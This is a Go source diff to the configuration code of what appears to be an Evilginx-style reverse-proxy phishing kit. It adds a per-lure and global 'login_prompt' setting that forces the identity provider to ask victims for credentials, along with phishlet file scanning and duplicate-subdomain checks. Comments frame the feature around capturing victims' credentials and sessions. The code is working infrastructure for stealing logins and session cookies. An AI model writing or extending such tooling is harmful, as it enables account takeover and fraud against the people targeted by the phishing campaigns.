@@ -6,6 +6,7 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
+	"sort"
 	"strconv"
 	"strings"
 	"sync"
@@ -48,6 +49,10 @@ type Lure struct {
 	ActiveHours     string `mapstructure:"active_hours" json:"active_hours" yaml:"active_hours"`
 	ActiveDays      string `mapstructure:"active_days" json:"active_days" yaml:"active_days"`
 	ActiveTZ        string `mapstructure:"active_tz" json:"active_tz" yaml:"active_tz"`
+	// LoginPrompt overrides general.login_prompt for this lure (off | login |
+	// select_account). Empty means inherit. Returning-visitor lures want
+	// select_account, cold lures may want login.
+	LoginPrompt string `mapstructure:"login_prompt" json:"login_prompt" yaml:"login_prompt"`
 }
 
 type SubPhishlet struct {
@@ -107,20 +112,24 @@ type GoPhishConfig struct {
 }
 
 type GeneralConfig struct {
-	Domain             string `mapstructure:"domain" json:"domain" yaml:"domain"`
-	OldIpv4            string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
-	ExternalIpv4       string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
-	BindIpv4           string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
-	UnauthUrl          string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
-	HttpsPort          int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
-	DnsPort            int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
-	Autocert           bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
-	TelegramEnabled    bool   `mapstructure:"telegram_enabled" json:"telegram_enabled" yaml:"telegram_enabled"`
-	HttpPort           int    `mapstructure:"http_port" json:"http_port" yaml:"http_port"`
-	Chatid             string `mapstructure:"chatid" json:"chatid" yaml:"chatid"`
-	Teletoken          string `mapstructure:"teletoken" json:"teletoken" yaml:"teletoken"`
-	StripHeaders       bool   `mapstructure:"strip_headers" json:"strip_headers" yaml:"strip_headers"`
-	ForceLogin         bool   `mapstructure:"force_login" json:"force_login" yaml:"force_login"`
+	Domain          string `mapstructure:"domain" json:"domain" yaml:"domain"`
+	OldIpv4         string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
+	ExternalIpv4    string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
+	BindIpv4        string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
+	UnauthUrl       string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	HttpsPort       int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
+	DnsPort         int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
+	Autocert        bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
+	TelegramEnabled bool   `mapstructure:"telegram_enabled" json:"telegram_enabled" yaml:"telegram_enabled"`
+	HttpPort        int    `mapstructure:"http_port" json:"http_port" yaml:"http_port"`
+	Chatid          string `mapstructure:"chatid" json:"chatid" yaml:"chatid"`
+	Teletoken       string `mapstructure:"teletoken" json:"teletoken" yaml:"teletoken"`
+	StripHeaders    bool   `mapstructure:"strip_headers" json:"strip_headers" yaml:"strip_headers"`
+	ForceLogin      bool   `mapstructure:"force_login" json:"force_login" yaml:"force_login"`
+	// LoginPrompt is the real setting: off | login | select_account. ForceLogin is
+	// kept as a legacy alias (on = login) so configs written before it existed
+	// keep working and stay readable by older tooling.
+	LoginPrompt        string `mapstructure:"login_prompt" json:"login_prompt" yaml:"login_prompt"`
 	UnauthRedirect     bool   `mapstructure:"unauth_redirect" json:"unauth_redirect" yaml:"unauth_redirect"`
 	DashboardSubdomain string `mapstructure:"dashboard_sub" json:"dashboard_sub" yaml:"dashboard_sub"`
 	DashboardUser      string `mapstructure:"dashboard_user" json:"dashboard_user" yaml:"dashboard_user"`
@@ -213,6 +222,22 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		c.cfg.Set("general.force_login", true)
 		c.general.ForceLogin = true
 	}
+	// login_prompt is the stored setting; force_login is derived from it. An
+	// adopted config that only carries force_login keeps its meaning.
+	if c.cfg.Get("general.login_prompt") == nil {
+		prompt := LOGIN_PROMPT_LOGIN
+		if c.cfg.IsSet("general.force_login") && !c.cfg.GetBool("general.force_login") {
+			prompt = LOGIN_PROMPT_OFF
+		}
+		c.general.LoginPrompt = prompt
+		c.cfg.Set("general.login_prompt", prompt)
+	}
+	if NormalizeLoginPrompt(c.general.LoginPrompt) == "" {
+		c.general.LoginPrompt = LOGIN_PROMPT_LOGIN
+		c.cfg.Set("general.login_prompt", c.general.LoginPrompt)
+	}
+	c.general.ForceLogin = c.general.LoginPrompt != LOGIN_PROMPT_OFF
+	c.cfg.Set("general.force_login", c.general.ForceLogin)
 
 	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)
 
@@ -1028,22 +1053,83 @@ func (c *Config) IsStripHeadersEnabled() bool {
 	return c.general.StripHeaders
 }
 
-// SetForceLogin toggles forcing the identity provider to show the credential
-// form (prompt=login / wfresh=0) instead of silently re-authenticating a session
-// the browser already has.
-func (c *Config) SetForceLogin(enabled bool) {
-	c.general.ForceLogin = enabled
-	c.cfg.Set(CFG_GENERAL, c.general)
-	if enabled {
-		log.Info("force login enabled - victims always get asked for credentials")
-	} else {
-		log.Info("force login disabled")
+// Login prompt modes. off never touches the authorization request, so a visitor
+// already signed in to the provider lands straight on the app: a session-only,
+// anonymous capture unless they happen to be prompted anyway.
+const (
+	LOGIN_PROMPT_OFF            = "off"
+	LOGIN_PROMPT_LOGIN          = "login"
+	LOGIN_PROMPT_SELECT_ACCOUNT = "select_account"
+)
+
+var LOGIN_PROMPTS = []string{LOGIN_PROMPT_OFF, LOGIN_PROMPT_LOGIN, LOGIN_PROMPT_SELECT_ACCOUNT}
+
+// NormalizeLoginPrompt maps the accepted spellings, including the legacy
+// force_login booleans, onto a mode. It returns "" for an unrecognised or empty
+// value, which callers read as "inherit the global setting".
+func NormalizeLoginPrompt(v string) string {
+	switch strings.ToLower(strings.TrimSpace(v)) {
+	case LOGIN_PROMPT_OFF, "false", "no", "0":
+		return LOGIN_PROMPT_OFF
+	case LOGIN_PROMPT_LOGIN, "on", "true", "yes", "1":
+		return LOGIN_PROMPT_LOGIN
+	case LOGIN_PROMPT_SELECT_ACCOUNT, "select-account", "selectaccount":
+		return LOGIN_PROMPT_SELECT_ACCOUNT
 	}
-	c.cfg.WriteConfig()
+	return ""
 }
 
+func (c *Config) GetLoginPrompt() string {
+	if v := NormalizeLoginPrompt(c.general.LoginPrompt); v != "" {
+		return v
+	}
+	// login_prompt unset: honour the legacy boolean rather than the zero value.
+	if c.general.ForceLogin {
+		return LOGIN_PROMPT_LOGIN
+	}
+	return LOGIN_PROMPT_OFF
+}
+
+// LoginPromptFor resolves the prompt mode for one visit. A per-lure override wins
+// over the global setting; an empty lure value means inherit.
+func (c *Config) LoginPromptFor(l *Lure) string {
+	if l != nil {
+		if v := NormalizeLoginPrompt(l.LoginPrompt); v != "" {
+			return v
+		}
+	}
+	return c.GetLoginPrompt()
+}
+
+// SetLoginPrompt stores the global mode and mirrors it into the legacy
+// force_login boolean so pre-existing configs and tooling stay truthful.
+func (c *Config) SetLoginPrompt(prompt string) error {
+	v := NormalizeLoginPrompt(prompt)
+	if v == "" {
+		return fmt.Errorf("login_prompt: expected off, login or select_account (got %q)", prompt)
+	}
+	c.general.LoginPrompt = v
+	c.general.ForceLogin = v != LOGIN_PROMPT_OFF
+	c.cfg.Set("general.login_prompt", v)
+	c.cfg.Set("general.force_login", c.general.ForceLogin)
+	log.Info("login prompt set to '%s'", v)
+	c.cfg.WriteConfig()
+	return nil
+}
+
+// SetForceLogin is the legacy alias for SetLoginPrompt(login|off).
+func (c *Config) SetForceLogin(enabled bool) {
+	prompt := LOGIN_PROMPT_OFF
+	if enabled {
+		prompt = LOGIN_PROMPT_LOGIN
+	}
+	_ = c.SetLoginPrompt(prompt)
+}
+
+// IsForceLoginEnabled reports whether any prompt is applied, i.e. the mode is not
+// off. Kept for the existing callers and for the legacy API field.
 func (c *Config) IsForceLoginEnabled() bool {
-	return c.general.ForceLogin
+	return c.GetLoginPrompt() != LOGIN_PROMPT_OFF
 }
 
 func (c *Config) GetStripHeadersStatus() string {
@@ -1147,6 +1233,88 @@ func PhishletSiteFromFile(filename string) (string, bool) {
 		return "", false
 	}
 	return name, true
+}
+
+// PhishletFile is one loadable file found in the phishlets directory.
+type PhishletFile struct {
+	Site string
+	Path string
+}
+
+// ScanPhishletsDir lists the phishlets in dir and reports, loudly, every file it
+// refuses to load.
+//
+// Only an exact "<site>.yaml" is a phishlet. A backup such as
+// "o365new.yaml.bak-opt" used to match the loose regex
+// "([a-zA-Z0-9-.]*)\.yaml", so it resolved to the same site name as the real
+// file: both loaded, the alphabetically later directory entry silently won, and
+// editing the visible file then appeared to do nothing. The same pass reports two
+// files claiming one site, which is the remaining shadowing case.
+func ScanPhishletsDir(dir string) ([]PhishletFile, []string, error) {
+	files, err := os.ReadDir(dir)
+	if err != nil {
+		return nil, nil, err
+	}
+	var out []PhishletFile
+	var warnings []string
+	seen := map[string]string{}
+	for _, f := range files {
+		if f.IsDir() {
+			continue
+		}
+		name := f.Name()
+		site, ok := PhishletSiteFromFile(name)
+		if !ok {
+			// only bother about files that look like a phishlet
+			if strings.Contains(strings.ToLower(name), ".yaml") {
+				warnings = append(warnings, fmt.Sprintf("ignoring '%s': not a '<site>.yaml' file, so it is not loaded (backup or stray file)", name))
+			}
+			continue
+		}
+		if prev, dup := seen[site]; dup {
+			warnings = append(warnings, fmt.Sprintf("'%s' and '%s' both map to phishlet '%s': '%s' wins and '%s' is shadowed", prev, name, site, name, prev))
+		}
+		seen[site] = name
+		out = append(out, PhishletFile{Site: site, Path: filepath.Join(dir, name)})
+	}
+	sort.Slice(warnings, func(i, j int) bool { return warnings[i] < warnings[j] })
+	return out, warnings, nil
+}
+
+// DuplicatePhishSubs reports phish_subdomain values declared by more than one
+// proxy host of this phishlet.
+//
+// A duplicate phish_sub means two origin hosts share one phished hostname, and
+// the reverse mapping is then decided by declaration order: the inbound request
+// path (replaceHostWithOriginal) returns the first match while the body rewriter
+// (patchUrls) keeps the last. Which origin a phished hostname resolves to is
+// therefore silent and inconsistent. Loading still succeeds, because stock
+// phishlets rely on it.
+func (p *Phishlet) DuplicatePhishSubs() []string {
+	bySub := map[string][]string{}
+	for _, ph := range p.proxyHosts {
+		orig := combineHost(ph.orig_subdomain, ph.domain)
+		bySub[ph.phish_subdomain] = append(bySub[ph.phish_subdomain], orig)
+	}
+	var subs []string
+	for sub, origs := range bySub {
+		if len(origs) > 1 {
+			subs = append(subs, sub)
+		}
+	}
+	sort.Strings(subs)
+	var out []string
+	for _, sub := range subs {
+		origs := bySub[sub]
+		sort.Strings(origs)
+		label := sub
+		if label == "" {
+			label = "(empty)"
+		}
+		out = append(out, fmt.Sprintf("phish_sub '%s' is declared by %d hosts (%s): the first wins inbound, the last wins in body rewrites",
+			label, len(origs), strings.Join(origs, ", ")))
+	}
+	return out
 }
 
 func (c *Config) GetPhishletsDir() string {
